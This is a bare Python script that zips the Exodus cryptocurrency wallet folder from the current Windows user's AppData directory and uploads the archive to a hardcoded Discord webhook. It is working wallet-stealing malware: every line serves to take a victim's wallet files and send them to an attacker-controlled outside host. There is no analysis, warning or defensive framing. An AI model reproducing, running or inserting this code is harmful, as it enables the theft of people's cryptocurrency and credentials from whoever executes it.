import os
import shutil
import requests

def zip_directory(directory_path, output_zip):
    shutil.make_archive(output_zip, 'zip', directory_path)

def send_file_to_webhook(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        response = requests.post(webhook_url, files=files)
        
        if response.status_code == 200:
            print(f"Successfully sent {file_path}")
        else:
            print(f"Failed to send {file_path}. Status code: {response.status_code}")

username = os.getlogin()

directory = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus.wallet')
output_zip = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus_wallet_{username}')
webhook_url = 'https://discord.com/api/webhooks/1262469390469693471/W-fncfCFfJ_RtGR7ZX2-Q8oOWm-qiBH0Pu9jpqjZvB3THuyjACBbCrGRqCwa3cmMbU6u'

if os.path.isdir(directory):
    zip_directory(directory, output_zip)
    send_file_to_webhook(f"{output_zip}.zip", webhook_url)
else:
    print(f"Directory {directory} does not exist.")
